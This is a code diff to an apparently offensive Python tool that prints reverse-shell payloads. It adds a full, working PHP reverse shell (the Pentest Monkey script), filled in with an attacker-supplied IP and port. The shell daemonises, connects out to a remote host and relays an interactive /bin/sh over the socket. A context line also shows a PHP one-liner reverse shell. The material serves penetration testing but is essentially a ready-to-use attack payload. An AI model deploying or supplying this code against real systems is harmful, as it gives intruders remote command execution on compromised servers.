@@ -234,7 +234,195 @@ def php_shell():
 
     print("Shell-07:\n\n   php -r '$sock=fsockopen(\""+IP+"\","+PORT+");$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'\n")
 
-    print("#######################################################")
+    print("#######################################################\n")
+    
+ 
+    print("Shell-08: (Pentest Monkey PHP Reverse Shell)\n\n")
+
+    print("<?php")
+
+    print("set_time_limit (0);")
+
+    print("$VERSION = \"1.0\";")
+
+    print("$ip = '"+IP+"';")
+
+    print("$port = "+PORT+";")
+
+    print("$chunk_size = 1400;")
+
+    print("$write_a = null;")
+
+    print("$error_a = null;")
+
+    print("$shell = 'uname -a; w; id; /bin/sh -i';")
+
+    print("$daemon = 0;")
+
+    print("$debug = 0;")
+
+    print("if (function_exists('pcntl_fork')) {")
+
+    print("	$pid = pcntl_fork();")
+
+    print("	if ($pid == -1) {")
+
+    print("		printit(\"ERROR: Can't fork\");")
+
+    print("		exit(1);")
+
+    print("	}")
+
+    print("	if ($pid) {")
+
+    print("		exit(0);")
+
+    print("	}")
+
+
+    print("	if (posix_setsid() == -1) {")
+
+    print("		printit(\"Error: Can't setsid()\");")
+
+    print("		exit(1);")
+
+    print("	}")
+
+    print("	$daemon = 1;")
+
+    print("} else {")
+
+    print("	printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");")
+
+    print("}")
+
+    print("chdir(\"/\");")
+
+    print("umask(0);")
+
+
+    print("$sock = fsockopen($ip, $port, $errno, $errstr, 30);")
+
+    print("if (!$sock) {")
+
+    print("	printit(\"$errstr ($errno)\");")
+
+    print("	exit(1);")
+
+    print("}")
+
+    print("$descriptorspec = array(")
+
+    print("   0 => array(\"pipe\", \"r\"),")
+
+    print("   1 => array(\"pipe\", \"w\"),")
+
+    print("   2 => array(\"pipe\", \"w\")")
+
+    print(");")
+
+    print("$process = proc_open($shell, $descriptorspec, $pipes);")
+
+    print("if (!is_resource($process)) {")
+
+    print("	printit(\"ERROR: Can't spawn shell\");")
+
+    print("	exit(1);")
+
+    print("}")
+
+
+    print("stream_set_blocking($pipes[0], 0);")
+
+    print("stream_set_blocking($pipes[1], 0);")
+
+    print("stream_set_blocking($pipes[2], 0);")
+
+    print("stream_set_blocking($sock, 0);")
+
+    print("printit(\"Successfully opened reverse shell to $ip:$port\");")
+
+    print("while (1) {")
+
+    print("	if (feof($sock)) {")
+
+    print("		printit(\"ERROR: Shell connection terminated\");")
+
+    print("		break;")
+
+    print("	}")
+
+    print("	if (feof($pipes[1])) {")
+
+    print("		printit(\"ERROR: Shell process terminated\");")
+
+    print("		break;")
+
+    print("	}")
+
+    print("	$read_a = array($sock, $pipes[1], $pipes[2]);")
+
+    print("	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);")
+
+    print("	if (in_array($sock, $read_a)) {")
+
+    print("		if ($debug) printit(\"SOCK READ\");")
+
+    print("		$input = fread($sock, $chunk_size);")
+
+    print("		if ($debug) printit(\"SOCK: $input\");")
+    print("		fwrite($pipes[0], $input);")
+
+    print("	}")
+
+    print("	if (in_array($pipes[1], $read_a)) {")
+
+    print("		if ($debug) printit(\"STDOUT READ\");")
+
+    print("		$input = fread($pipes[1], $chunk_size);")
+
+    print("		if ($debug) printit(\"STDOUT: $input\");")
+
+    print("		fwrite($sock, $input);")
+
+    print("	}")
+
+    print("	if (in_array($pipes[2], $read_a)) {")
+
+    print("		if ($debug) printit(\"STDERR READ\");")
+
+    print("		$input = fread($pipes[2], $chunk_size);")
+
+    print("		if ($debug) printit(\"STDERR: $input\");")
+
+    print("		fwrite($sock, $input);")
+    print("	}")
+
+    print("}")
+
+    print("fclose($sock);")
+
+    print("fclose($pipes[0]);")
+
+    print("fclose($pipes[1]);")
+
+    print("fclose($pipes[2]);")
+
+    print("proc_close($process);")
+
+    print("function printit ($string) {")
+
+    print("	if (!$daemon) {")
+
+    print("		print \"$string\n\";")
+
+    print("	}")
+
+    print("}")
+
+    print("?> \n")
+
+    print("#######################################################")   
 
     print("")
 
